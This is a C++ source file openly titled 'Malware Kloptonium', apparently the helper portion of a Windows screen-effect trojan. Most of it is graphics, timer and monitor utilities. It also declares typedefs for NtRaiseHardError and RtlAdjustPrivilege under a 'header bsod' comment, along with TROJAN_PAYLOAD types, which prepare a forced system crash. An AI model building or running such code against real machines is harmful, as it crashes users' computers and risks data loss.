﻿// Malware Kloptonium
#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <windowsx.h>
#include <windef.h>
#include <winnt.h>
#include <math.h>
#include <stdlib.h>
#include <winternl.h>
#define _USE_MATH_DEFINES 1
#define PAYLOAD_TIME 30
#include <cmath>
#include <cstdlib>
#include <mmsystem.h>
#include <iostream>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma warning(disable : 4996)
#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
#define _USE_MATH_DEFINES 1
//header bsod
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
// something function
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;



COLORREF RndRGB2() {//remake by P. ĐĂNG
	int clr = rand() % 6;
	if (clr == 0) return RGB(123, 123, 0);
	if (clr == 1) return RGB(0, 123, 123);
	if (clr == 2) return RGB(0, 0, 123);
	if (clr == 3) return RGB(112, 0, 444);
	if (clr == 4) return RGB(216, 246, 0);
	if (clr == 5) return RGB(0, 246, 444);
}

namespace Math
{
	FLOAT SineWave(FLOAT a, FLOAT b, FLOAT c, FLOAT d)
	{
		return a * sin(2 * M_PI * b * c / d);
	}
}

int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);
int shakeIntensity = 1;
int warpIntensity = 3;
bool random = true;
double intensity = 0.0;
bool state = false;

typedef struct {
	float x;
	float y;
	float z;
} VERTEX;

typedef struct {
	int vtx0;
	int vtx1;
} EDGE;

COLORREF COLORHSL(int length) {
	double h = fmod(length, 360.0);
	double s = 1.0;
	double l = 0.5;
	double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
	double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
	double m = l - c / 2.0;
	double r1, g1, b1;
	if (h < 60) {
		r1 = c; g1 = x; b1 = 0;
	}
	else if (h < 120) {
		r1 = x; g1 = c; b1 = 0;
	}
	else if (h < 180) {
		r1 = 0; g1 = c; b1 = x;
	}
	else if (h < 240) {
		r1 = 0; g1 = x; b1 = c;
	}
	else if (h < 300) {
		r1 = x; g1 = 0; b1 = c;
	}
	else {
		r1 = c; g1 = 0; b1 = x;
	}
	int red = static_cast<int>((r1 + m) * 255);
	int green = static_cast<int>((g1 + m) * 255);
	int blue = static_cast<int>((b1 + m) * 255);
	return RGB(red, green, blue);
}

typedef void(TROJAN_PAYLOAD)(int t, HDC hdcScreen);
typedef void(TROJAN_SHADER)(int t, int w, int h, PRGBQUAD prgbScreen);
typedef void(AUDIO_SEQUENCE)(int nSamplesPerSec, int nSampleCount, PSHORT psSamples), * PAUDIO_SEQUENCE;

int RotateDC(HDC hdc, int Angle, POINT ptCenter)
{
	int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
	XFORM xform;
	if (Angle != 0)
	{
		double fangle = (double)Angle / 180. * 3.1415926;
		xform.eM11 = (float)cos(fangle);
		xform.eM12 = (float)sin(fangle);
		xform.eM21 = (float)-sin(fangle);
		xform.eM22 = (float)cos(fangle);
		xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
		xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
		SetWorldTransform(hdc, &xform);
	}
	return nGraphicsMode;
}

extern RECT GetVirtualScreen();
extern BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, PRECT prcBounds, LPARAM lParam);
extern POINT GetVirtualScreenPos();
extern SIZE GetVirtualScreenSize();
extern DWORD Time;
extern void InitTimer(UINT uDelay);
extern void CALLBACK TimerProc(HWND hwndTimer, UINT uMsg, UINT_PTR ulTimerID, DWORD dwTime);

RECT GetVirtualScreen()
{
	RECT rcScreen = { 0 };
	EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, (LPARAM)&rcScreen);
	return rcScreen;
}
POINT GetVirtualScreenPos()
{
	RECT rcScreen = GetVirtualScreen();
	POINT ptScreen =
	{
		rcScreen.left,
		rcScreen.top
	};
	return ptScreen;
}
SIZE GetVirtualScreenSize()
{
	RECT rcScreen = GetVirtualScreen();
	SIZE szScreen =
	{
		rcScreen.right - rcScreen.left,
		rcScreen.bottom - rcScreen.top
	};
	return szScreen;
}
BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, PRECT prcBounds, LPARAM lParam) {
	PRECT prcParam = (RECT*)lParam;
	UnionRect(prcParam, prcParam, prcBounds);
	return true;
}

DWORD Time;
void InitTimer(UINT uDelay)
{
	UINT_PTR id = SetTimer(NULL, 0, uDelay, TimerProc);
	MSG msg = { 0 };
	while (true)
	{
		if (PeekMessage(&msg, 0, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}
}
void CALLBACK TimerProc(HWND hwndTimer, UINT uMsg, UINT_PTR ulTimerID, DWORD dwTime)
{
	Time++;
}